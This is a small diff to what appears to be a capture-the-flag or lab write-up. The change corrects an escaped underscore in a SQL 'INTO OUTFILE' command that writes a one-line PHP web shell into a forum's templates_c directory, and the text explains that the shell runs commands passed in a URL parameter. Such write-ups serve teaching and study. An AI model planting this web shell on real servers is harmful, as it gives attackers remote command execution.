@@ -172,7 +172,7 @@ we find : [12:35:51] 200 -    5KB - /forum/templates_c/
 
 we know that the site is using apache so the pages are in /var/www/forum/
 
-we run the SQL command : SELECT "<?php system($\_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/exploit.php"
+we run the SQL command : SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/exploit.php"
 
 This creates `exploit.php`, which executes the command provided through the `cmd` parameter.
 
